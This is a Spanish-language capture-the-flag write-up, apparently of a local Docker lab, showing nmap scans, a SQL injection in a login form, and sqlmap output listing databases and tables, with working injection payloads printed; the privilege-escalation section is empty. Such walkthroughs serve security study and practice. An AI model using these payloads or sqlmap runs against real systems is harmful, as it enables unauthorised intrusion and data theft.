![](../../../Images/Pasted%20image%2020240921182525.png)

# Enumeración

## Nmap

El escaneo de **nmap** nos enseña la existencia de un servicio SSH i un servicio HTTP funcionando.

```
> nmap --open --min-rate 10000 -Pn -n -oN scans/allTCPPorts $target

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-23 12:21 CEST
Nmap scan report for 172.17.0.2
Host is up (0.00025s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 0.08 seconds
```

```
> nmap -oN scans/targetedTCPPorts -sCV $target -p 22,80                       
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-23 12:22 CEST
Nmap scan report for 172.17.0.2
Host is up (0.00016s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 72:1f:e1:92:70:3f:21:a2:0a:c6:a6:0e:b8:a2:aa:d5 (ECDSA)
|_  256 8f:3a:cd:fc:03:26:ad:49:4a:6c:a1:89:39:f9:7c:22 (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Iniciar Sesi\xC3\xB3n
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.96 seconds
```

## Website (80 TCP Port)

En el sitio web nos encontramos con una panel de inicio de sesión. Comprobando los campos del formulario si contienen una posible vulnerabilidad SQLi, comprobamos que el campo de usuario es vulnerable.

![](../../../Images/Pasted%20image%2020240923102252.png)
# Foothold

Utilizando la herramienta SQLMap realizamos la autoexplotación de la vulnerabilidad encontrada para extraer datos interesantes. Pero, antes de todo, capturamos la petición GET con Burpsuite.

![](../../../Images/Pasted%20image%2020240923103040.png)


Ahora pasamos la petición a SLQMap y le dejamos trabajar.

```
> sqlmap -r req.txt --dbs                                                       
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.8.3#stable}
|_ -| . [)]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 12:31:17 /2024-09-23/

[12:31:17] [INFO] parsing HTTP request from 'req.txt'
[12:31:18] [WARNING] provided value for parameter 'submit' is empty. Please, always use only valid parameter values so sqlmap could be able to run properly
[12:31:18] [INFO] resuming back-end DBMS 'mysql' 
[12:31:18] [INFO] testing connection to the target URL
got a 302 redirect to 'http://172.17.0.2/index.php'. Do you want to follow? [Y/n] y
redirect is a result of a POST request. Do you want to resend original POST data to a new location? [Y/n] y
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: name (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
    Payload: name=-5829' OR 2077=2077#&password=admin&submit=

    Type: error-based
    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: name=admin' OR (SELECT 4254 FROM(SELECT COUNT(*),CONCAT(0x7176707071,(SELECT (ELT(4254=4254,1))),0x7171707a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- ryzS&password=admin&submit=

    Type: stacked queries
    Title: MySQL >= 5.0.12 stacked queries (comment)
    Payload: name=admin';SELECT SLEEP(5)#&password=admin&submit=

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: name=admin' AND (SELECT 2043 FROM (SELECT(SLEEP(5)))TFsI)-- nAJP&password=admin&submit=
---
[12:31:23] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 22.04 (jammy)
web application technology: Apache 2.4.52
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[12:31:23] [INFO] fetching database names
[12:31:23] [INFO] resumed: 'information_schema'
[12:31:23] [INFO] resumed: 'mysql'
[12:31:23] [INFO] resumed: 'performance_schema'
[12:31:23] [INFO] resumed: 'register'
[12:31:23] [INFO] resumed: 'sys'
available databases [5]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] register
[*] sys

[12:31:23] [INFO] fetched data logged to text files under '/home/rh4ps00dy/.local/share/sqlmap/output/172.17.0.2'
[12:31:23] [WARNING] your sqlmap version is outdated

[*] ending @ 12:31:23 /2024-09-23/
```

```
sqlmap -r req.txt -D register --tables                                                                                              
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.8.3#stable}
|_ -| . ["]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 12:33:21 /2024-09-23/

[12:33:21] [INFO] parsing HTTP request from 'req.txt'
[12:33:21] [WARNING] provided value for parameter 'submit' is empty. Please, always use only valid parameter values so sqlmap could be able to run properly
[12:33:21] [INFO] resuming back-end DBMS 'mysql' 
[12:33:21] [INFO] testing connection to the target URL
got a 302 redirect to 'http://172.17.0.2/index.php'. Do you want to follow? [Y/n] y
redirect is a result of a POST request. Do you want to resend original POST data to a new location? [Y/n] y
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: name (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
    Payload: name=-5829' OR 2077=2077#&password=admin&submit=

    Type: error-based
    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: name=admin' OR (SELECT 4254 FROM(SELECT COUNT(*),CONCAT(0x7176707071,(SELECT (ELT(4254=4254,1))),0x7171707a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- ryzS&password=admin&submit=

    Type: stacked queries
    Title: MySQL >= 5.0.12 stacked queries (comment)
    Payload: name=admin';SELECT SLEEP(5)#&password=admin&submit=

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: name=admin' AND (SELECT 2043 FROM (SELECT(SLEEP(5)))TFsI)-- nAJP&password=admin&submit=
---
[12:33:23] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 22.04 (jammy)
web application technology: Apache 2.4.52
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[12:33:23] [INFO] fetching tables for database: 'register'
[12:33:23] [INFO] resumed: 'users'
Database: register
[1 table]
+-------+
| users |
+-------+

[12:33:23] [INFO] fetched data logged to text files under '/home/rh4ps00dy/.local/share/sqlmap/output/172.17.0.2'
[12:33:23] [WARNING] your sqlmap version is outdated

[*] ending @ 12:33:23 /2024-09-23/
```

```

```




# Escalada de privilegios



